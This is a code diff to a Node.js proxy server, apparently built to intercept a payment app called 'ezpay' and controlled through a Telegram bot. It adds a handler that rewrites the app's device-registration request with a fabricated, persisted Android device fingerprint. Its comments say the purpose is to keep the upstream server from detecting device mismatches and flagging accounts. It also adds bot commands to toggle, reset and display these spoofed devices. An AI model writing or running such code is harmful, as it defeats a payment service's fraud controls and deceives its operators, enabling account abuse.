@@ -106,7 +106,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('ezpayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'deviceLockEnabled'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) {
             data[key] = current[key];
@@ -1960,6 +1960,45 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text === '/devicelock' || text === '/devicelock on' || text === '/devicelock off') {
+      data = await loadData(true);
+      if (text === '/devicelock on') data.deviceLockEnabled = true;
+      else if (text === '/devicelock off') data.deviceLockEnabled = false;
+      else data.deviceLockEnabled = (data.deviceLockEnabled === false); // toggle
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `🛡 Device Lock: ${data.deviceLockEnabled !== false ? 'ON 🟢' : 'OFF 🔴'}\n\nON = har user ka first-seen device fingerprint Redis me lock ho jata hai. Sab subsequent /memberDevice/add calls wahi same fingerprint upstream forward karenge → "system service is very busy" / device-mismatch logout block.`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/devicereset ')) {
+      const targetId = text.substring(13).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /devicereset <userId|MC code>'); return res.sendStatus(200); }
+      const mc = targetId.startsWith('MC') ? targetId : ('MC' + targetId);
+      let removed = 0;
+      if (redis) { try { removed = await redis.hdel('ezpayDeviceMap', mc); } catch(e) {} }
+      await bot.sendMessage(chatId, `🗑 Device fingerprint reset: ${mc}\nRemoved: ${removed}\n\nNext /memberDevice/add se naya random Indian device generate hoga.`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/deviceshow ')) {
+      const targetId = text.substring(12).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /deviceshow <userId|MC code>'); return res.sendStatus(200); }
+      const mc = targetId.startsWith('MC') ? targetId : ('MC' + targetId);
+      let stored = null;
+      if (redis) {
+        try {
+          const raw = await redis.hget('ezpayDeviceMap', mc);
+          if (raw) stored = (typeof raw === 'string') ? JSON.parse(raw) : raw;
+        } catch(e) {}
+      }
+      if (!stored) { await bot.sendMessage(chatId, `ℹ️ ${mc} ke liye koi locked device nahi hai. (User ne abhi tak /memberDevice/add nahi kiya, ya reset ho gaya.)`); return res.sendStatus(200); }
+      let m = `🛡 LOCKED DEVICE: ${mc}\n━━━━━━━━━━━━━━━━━━\n`;
+      for (const [k, v] of Object.entries(stored)) m += `${k}: ${v}\n`;
+      await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -3114,6 +3153,97 @@ app.all('/app/api/customer/list', async (req, res) => {
       sendJson(res, respHeaders, jsonResp, respBody);
     }
   } catch(e) { await transparentProxy(req, res); }
+});
+
+// ===== Device fingerprint lock (memberDevice/add) =====
+// APK posts DeviceInfoApi (deviceName/model/brand/googleId/resolution/networkOperator/etc)
+// to /app/api/memberDevice/add right after login. Server detects device-mismatch ⇒ kicks
+// session and flags account ("system service is very busy" / "token check error").
+// Fix: per-memberCode, generate ONE stable random Indian device fingerprint, store in
+// Redis (`ezpayDeviceMap`), and replay it on every subsequent call so server always
+// sees the SAME device for that member. Toggle via bot: /devicelock on/off.
+function makeDeviceFingerprint(seedKey) {
+  const seed = crypto.createHash('sha256').update(String(seedKey)).digest();
+  const pick = (arr, off) => arr[seed[off] % arr.length];
+  const brands = [
+    { brand: 'Xiaomi', manuf: 'Xiaomi', models: ['Redmi Note 11', 'Redmi 10', 'Redmi 9A', 'POCO M3', 'M2010J19SI', 'M2102J20SG', '22011119TI'] },
+    { brand: 'realme', manuf: 'realme', models: ['RMX2185', 'RMX3201', 'RMX3231', 'RMX3501', 'RMX3151'] },
+    { brand: 'samsung', manuf: 'samsung', models: ['SM-A125F', 'SM-A325F', 'SM-M127F', 'SM-A536E', 'SM-G991B', 'SM-A047F'] },
+    { brand: 'vivo', manuf: 'vivo', models: ['V2027', 'V2111', 'V2120', 'V2150', 'V2207'] },
+    { brand: 'OPPO', manuf: 'OPPO', models: ['CPH2239', 'CPH2371', 'CPH2333', 'CPH2451'] },
+    { brand: 'motorola', manuf: 'motorola', models: ['moto g32', 'moto g42', 'moto g62 5G', 'moto e40'] }
+  ];
+  const b = pick(brands, 0);
+  const model = pick(b.models, 1);
+  const osVerArr = ['10', '11', '12', '13', '14'];
+  const osVer = pick(osVerArr, 2);
+  const resolutions = ['1080x2400', '720x1600', '1080x2340', '1440x3088', '720x1612', '1080x2412'];
+  const operators = [
+    { op: '405854', name: 'Jio' }, { op: '40410', name: 'Airtel' },
+    { op: '404005', name: 'Vodafone Idea' }, { op: '40455', name: 'BSNL' },
+    { op: '405845', name: 'Jio' }
+  ];
+  const op = pick(operators, 3);
+  const buildId = `RP1A.${(seed[4] % 30) + 200001}.0${(seed[5] % 9) + 1}`;
+  const incremental = String(seed.readUInt32BE(6) % 9999999).padStart(7, '0');
+  const fingerprint = `${b.brand}/${model}/${model.toLowerCase().replace(/[^a-z0-9]/g, '')}:${osVer}/${buildId}/${incremental}:user/release-keys`;
+  const androidId = seed.slice(0, 8).toString('hex');
+  return {
+    deviceName: model, model: model, brand: b.brand, googleId: androidId,
+    rootJailbreak: '0', deviceIp: '', resolution: pick(resolutions, 7),
+    deviceType: '1', deviceManufacturer: b.manuf, os: 'Android', osVersion: osVer,
+    buildVersion: fingerprint, networkOperator: op.op, networkOperatorName: op.name,
+    userAgent: `Mozilla/5.0 (Linux; Android ${osVer}; ${model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36`
+  };
+}
+
+app.post('/app/api/memberDevice/add', async (req, res) => {
+  const data = await loadData();
+  let userId = '';
+  try { userId = (await extractUserId(req, null)) || ''; } catch(e) {}
+  const memberCode = userId ? (String(userId).startsWith('MC') ? String(userId) : ('MC' + userId)) : '';
+  const tokSnip = (getTokenFromReq(req) || '').substring(0, 32);
+  const lockEnabled = (data.deviceLockEnabled !== false); // default ON
+  // Seed includes random bytes so /devicereset → next /memberDevice/add yields a brand-new
+  // fingerprint. Stored result is replayed verbatim on subsequent calls (stability).
+  const seedKey = (memberCode || tokSnip || 'anon') + ':' + crypto.randomBytes(12).toString('hex');
+
+  let stored = null;
+  if (lockEnabled && redis && memberCode) {
+    try {
+      const raw = await redis.hget('ezpayDeviceMap', memberCode);
+      if (raw) stored = (typeof raw === 'string') ? (JSON.parse(raw) || null) : raw;
+    } catch(e) {}
+  }
+  if (lockEnabled && !stored) {
+    stored = makeDeviceFingerprint(seedKey);
+    if (redis && memberCode) {
+      redis.hset('ezpayDeviceMap', memberCode, JSON.stringify(stored)).catch(()=>{});
+    }
+  }
+
+  if (lockEnabled && stored) {
+    const newBody = Buffer.from(JSON.stringify(stored));
+    req.rawBody = newBody;
+    req.parsedBody = stored;
+    req.headers['content-length'] = String(newBody.length);
+    req.headers['content-type'] = 'application/json; charset=utf-8';
+  }
+
+  if (data.adminChatId && bot) {
+    const tag = (lockEnabled && stored)
+      ? `🛡 DEVICE LOCK (${memberCode || 'unknown'})\n📱 ${stored.brand} ${stored.model} • Android ${stored.osVersion}\n🆔 ${stored.googleId} • ${stored.networkOperatorName}`
+      : `📱 DEVICE PASSTHROUGH (lock OFF) — memberCode=${memberCode || 'unknown'}`;
+    bot.sendMessage(data.adminChatId, tag).catch(()=>{});
+  }
+
+  try {
+    const { response, respBody, respHeaders } = await proxyFetch(req);
+    res.writeHead(response.status, respHeaders);
+    res.end(respBody);
+  } catch(e) {
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error', message: e.message });
+  }
 });
 
 app.all('*', async (req, res) => {
